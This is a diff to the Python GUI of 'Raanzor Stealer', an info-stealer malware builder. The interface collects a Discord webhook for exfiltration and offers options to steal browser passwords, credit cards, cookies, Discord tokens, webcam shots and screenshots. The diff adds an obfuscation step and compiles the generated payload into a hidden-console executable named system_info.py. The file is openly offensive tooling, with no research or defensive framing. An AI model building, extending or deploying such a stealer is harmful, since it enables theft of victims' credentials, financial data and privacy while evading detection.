@@ -1,5 +1,6 @@
 import customtkinter as ctk
 from customtkinter import CTkImage
+from tkinter import ttk
 from PIL import Image
 import requests
 import os
@@ -25,7 +26,6 @@ ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("dark-blue")
 
 
-
 class RaanzorStealer(ctk.CTk):
     def __init__(self):
         super().__init__()
@@ -34,24 +34,30 @@ class RaanzorStealer(ctk.CTk):
         self.minsize(900, 800)
         self.configure(bg="#1E1E1E")
 
+        self.build_top_frame()
+        self.build_webhook_frame()
+        self.build_checkbox_section()
+        self.build_obfuscation_option()
+        self.build_status_label()
+
+    def build_top_frame(self):
         top_frame = ctk.CTkFrame(self, fg_color="#2B2B2B")
         top_frame.pack(fill="x", pady=15, padx=15)
 
         image_path = "asset/raanzor.png"
         pil_image = Image.open(image_path)
-        ctki_image = CTkImage(pil_image, size=(120, 120))
+        ctki_image = ctk.CTkImage(pil_image, size=(120, 120))
         logo_label = ctk.CTkLabel(top_frame, image=ctki_image, text="")
         logo_label.image = ctki_image
-        logo_label.pack(side="left")
+        logo_label.pack(side="left", padx=10)
 
         title_label = ctk.CTkLabel(
             top_frame,
             text="Raanzor Stealer",
-            font=("Comic Sans MS", 48, "bold"),
+            font=("Arial", 42, "bold"),
             text_color="#E53935",
-            anchor="w"
         )
-        title_label.pack(side="left", padx=20, pady=20, fill="x", expand=True)
+        title_label.pack(side="left", padx=20)
 
         right_buttons_frame = ctk.CTkFrame(top_frame, fg_color="transparent")
         right_buttons_frame.pack(side="right", padx=10, pady=10)
@@ -59,7 +65,7 @@ class RaanzorStealer(ctk.CTk):
         self.format_option = ctk.CTkComboBox(
             right_buttons_frame,
             values=["Python (.py)", "Executable (.exe)"],
-            width=170,
+            width=160,
             height=35,
             fg_color="#2B2B2B",
             dropdown_fg_color="#2B2B2B",
@@ -68,7 +74,7 @@ class RaanzorStealer(ctk.CTk):
             button_hover_color="#B22222"
         )
         self.format_option.set("Python (.py)")
-        self.format_option.pack(side="left", padx=(0,10))
+        self.format_option.pack(side="left", padx=(0, 10))
 
         self.generate_btn = ctk.CTkButton(
             right_buttons_frame,
@@ -81,14 +87,15 @@ class RaanzorStealer(ctk.CTk):
         )
         self.generate_btn.pack(side="left")
 
+    def build_webhook_frame(self):
         webhook_frame = ctk.CTkFrame(self, fg_color="#2B2B2B")
-        webhook_frame.pack(fill="x", padx=30, pady=(0, 20))
+        webhook_frame.pack(fill="x", padx=30, pady=(0, 15))
 
-        webhook_label = ctk.CTkLabel(webhook_frame, text="Webhook URL:", font=("Segoe UI", 14), text_color="white")
-        webhook_label.grid(row=0, column=0, sticky="w", padx=5, pady=5)
+        webhook_label = ctk.CTkLabel(webhook_frame, text="Webhook URL:", font=("Arial", 14), text_color="white")
+        webhook_label.grid(row=0, column=0, sticky="w", padx=10, pady=10)
 
         self.webhook_entry = ctk.CTkEntry(webhook_frame, width=400, placeholder_text="https://discord.com/api/webhooks/...")
-        self.webhook_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
+        self.webhook_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=10)
 
         self.test_webhook_btn = ctk.CTkButton(
             webhook_frame,
@@ -99,10 +106,11 @@ class RaanzorStealer(ctk.CTk):
             width=130,
             height=30
         )
-        self.test_webhook_btn.grid(row=0, column=2, padx=10)
+        self.test_webhook_btn.grid(row=0, column=2, padx=10, pady=10)
 
         webhook_frame.grid_columnconfigure(1, weight=1)
 
+    def build_checkbox_section(self):
         self.options = {
             "System Info": ctk.BooleanVar(),
             "IP Info": ctk.BooleanVar(),
@@ -125,6 +133,7 @@ class RaanzorStealer(ctk.CTk):
             "History": ctk.BooleanVar(),
             "Cookies": ctk.BooleanVar(),
             "Common Files": ctk.BooleanVar(),
+            "Obfuscate Code": ctk.BooleanVar()
         }
 
         container = ctk.CTkFrame(self, fg_color="#2B2B2B")
@@ -134,13 +143,7 @@ class RaanzorStealer(ctk.CTk):
         scrollbar = ctk.CTkScrollbar(container, orientation="vertical", command=canvas.yview)
         scrollable_frame = ctk.CTkFrame(canvas, fg_color="#2B2B2B")
 
-        scrollable_frame.bind(
-            "<Configure>",
-            lambda e: canvas.configure(
-                scrollregion=canvas.bbox("all")
-            )
-        )
-
+        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
         canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
         canvas.configure(yscrollcommand=scrollbar.set)
 
@@ -148,29 +151,19 @@ class RaanzorStealer(ctk.CTk):
         scrollbar.pack(side="right", fill="y")
 
         categories = {
-            "System Info & Network": [
-                "System Info", "IP Info", "Wi-Fi SSID", "Kill All Programs", "Shutdown"
-            ],
-            "User Data & Privacy": [
-                "Clipboard", "Browsers List", "Browsers Passwords", "Credit Cards", "Cookies", "History", "Common Files"
-            ],
-            "Security & Intrusion": [
-                "Antivirus List", "Fake Error", "Disconnect User"
-            ],
-            "Multimedia": [
-                "Screenshot", "Webcam Screen"
-            ],
-            "Discord & Misc": [
-                "Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop"
-            ]
+            "System Info & Network": ["System Info", "IP Info", "Wi-Fi SSID", "Kill All Programs", "Shutdown"],
+            "User Data & Privacy": ["Clipboard", "Browsers List", "Browsers Passwords", "Credit Cards", "Cookies", "History", "Common Files"],
+            "Security & Intrusion": ["Antivirus List", "Fake Error", "Disconnect User"],
+            "Multimedia": ["Screenshot", "Webcam Screen"],
+            "Discord & Misc": ["Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop"]
         }
 
         self.checkboxes = {}
-
         row_idx = 0
+
         for category, opts in categories.items():
-            cat_label = ctk.CTkLabel(scrollable_frame, text=category, font=("", 16, "bold"), text_color="#E53935")
-            cat_label.grid(row=row_idx, column=0, sticky="w", pady=(10,5), columnspan=3)
+            cat_label = ctk.CTkLabel(scrollable_frame, text=category, font=("Arial", 16, "bold"), text_color="#E53935")
+            cat_label.grid(row=row_idx, column=0, sticky="w", pady=(10, 5), columnspan=3)
             row_idx += 1
 
             col = 0
@@ -179,8 +172,6 @@ class RaanzorStealer(ctk.CTk):
                     scrollable_frame,
                     text=opt,
                     variable=self.options[opt],
-                    onvalue=True,
-                    offvalue=False,
                     text_color="white",
                     fg_color="#2B2B2B",
                     hover_color="#3E3E3E",
@@ -188,18 +179,34 @@ class RaanzorStealer(ctk.CTk):
                 )
                 checkbox.grid(row=row_idx, column=col, sticky="w", padx=10, pady=3)
                 self.checkboxes[opt] = checkbox
-
                 col += 1
                 if col > 2:
                     col = 0
                     row_idx += 1
             row_idx += 1
 
-        self.status_label = ctk.CTkLabel(self, text="", font=("Segoe UI", 14), text_color="#E53935")
-        self.status_label.pack(pady=10)
+    def build_obfuscation_option(self):
+        sep = ttk.Separator(self, orient="horizontal")
+        sep.pack(fill="x", padx=30, pady=10)
 
-        for opt in self.options:
-            self.checkbox_color_update(opt)
+        obfuscate_frame = ctk.CTkFrame(self, fg_color="#2B2B2B")
+        obfuscate_frame.pack(fill="x", padx=30)
+
+        obfuscate_checkbox = ctk.CTkCheckBox(
+            obfuscate_frame,
+            text="Obfuscate Code",
+            variable=self.options["Obfuscate Code"],
+            text_color="white",
+            fg_color="#2B2B2B",
+            hover_color="#3E3E3E",
+            command=lambda: self.checkbox_color_update("Obfuscate Code")
+        )
+        obfuscate_checkbox.pack(padx=10, pady=10, anchor="w")
+        self.checkboxes["Obfuscate Code"] = obfuscate_checkbox
+
+    def build_status_label(self):
+        self.status_label = ctk.CTkLabel(self, text="", font=("Arial", 14), text_color="#E53935")
+        self.status_label.pack(pady=10)
 
     def checkbox_color_update(self, option_name):
         checkbox = self.checkboxes.get(option_name)
@@ -209,11 +216,13 @@ class RaanzorStealer(ctk.CTk):
             else:
                 checkbox.configure(fg_color="#2B2B2B", text_color="white")
 
+    def show_message(self, message):
+        self.status_label.configure(text=message)
 
     def test_webhook(self):
         url = self.webhook_entry.get()
         if not url.startswith("http"):
-            self.show_message("Invalid Webhook")
+            self.show_message("Invalid Webhook URL")
             return
         try:
             response = requests.post(url, json={"content": "Webhook Test"})
@@ -233,12 +242,34 @@ class RaanzorStealer(ctk.CTk):
         output_format = self.format_option.get()
 
         if output_format == "Python (.py)":
-            with open("baliz_stealer_file.py", "w", encoding="utf-8") as f:
+            script_path = "baliz_stealer_file.py"
+            with open(script_path, "w", encoding="utf-8") as f:
                 f.write(script_content)
-            self.show_message("Python script generated successfully.")
+
+            if self.options["Obfuscate Code"].get():
+                try:
+                    from programs.RaanzorOBFU import RaanzorObfuscator
+                    obfuscator = RaanzorObfuscator(script_content, script_path)
+                    obfuscator.obfuscate()
+                    self.show_message("Python script generated and obfuscated successfully.")
+                except Exception as e:
+                    self.show_message(f"Error during obfuscation: {e}")
+            else:
+                self.show_message("Python script generated successfully.")
         else:
-            with open("system_info.py", "w", encoding="utf-8") as f:
+            script_path = "system_info.py"
+            with open(script_path, "w", encoding="utf-8") as f:
                 f.write(script_content)
+
+            if self.options["Obfuscate Code"].get():
+                try:
+                    from programs.RaanzorOBFU import RaanzorObfuscator
+                    obfuscator = RaanzorObfuscator(script_content, script_path)
+                    obfuscator.obfuscate()
+                    self.show_message("Script obfuscated successfully.")
+                except Exception as e:
+                    self.show_message(f"Error during obfuscation: {e}")
+
             try:
                 os.system("pyinstaller --onefile --noconsole system_info.py")
                 self.show_message("Executable script generated successfully.")
